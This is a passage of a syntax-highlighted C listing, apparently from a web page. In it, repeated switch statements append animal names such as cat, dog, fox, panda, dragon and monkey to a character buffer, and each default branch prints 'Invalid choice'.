punctuation\">;</span></pre></td></tr><tr><td data-num=\"242\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"243\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'f'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"244\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"245\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'x'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"246\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"247\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"248\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'p'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"249\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"250\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"251\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"252\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"253\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"254\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"255\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"256\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'r'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"257\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"258\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"259\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"260\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"261\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"262\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"263\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'m'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"264\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"265\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"266\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'k'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"267\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"268\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"269\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"270\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"271\"></td><td><pre>            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"272\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"273\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>           <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"274\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"275\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'c'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"276\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"277\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'t'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"278\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"279\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"280\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"281\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"282\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"283\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"284\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"285\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'f'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"286\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"287\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'x'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"288\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"289\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"290\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'p'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"291\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"292\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"293\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"294\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"295\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"296\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"297\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"298\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'r'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"299\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"300\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"301\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"302\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"303\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"304\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"305\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'m'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"306\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"307\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"308\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'k'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"309\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"310\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"311\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"312\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"313\"></td><td><pre>            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"314\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"315\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>           <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"316\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"317\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'c'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"318\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"319\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'t'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"320\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"321\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"322\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"323\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"324\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"325\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"326\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"327\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'f'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"328\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"329\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'x'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"330\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"331\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"332\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'p'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"333\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"334\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"335\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"336\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"337\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"338\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"339\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"340\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'r'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"341\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"342\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"343\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"344\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"345\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"346\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"347\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'m'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"348\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"349\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"350\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'k'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"351\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"352\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"353\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"354\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"355\"></td><td><pre>            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"356\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"357\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>           <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>ii<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"358\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"359\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'c'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"360\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"361\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'t'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"362\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"363\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"364\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"365\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"366\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"367\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"368\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"369\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'f'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"370\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"371\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'x'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"372\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"373\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"374\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'p'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"375\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"376\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"377\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"378\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"379\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"380\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token 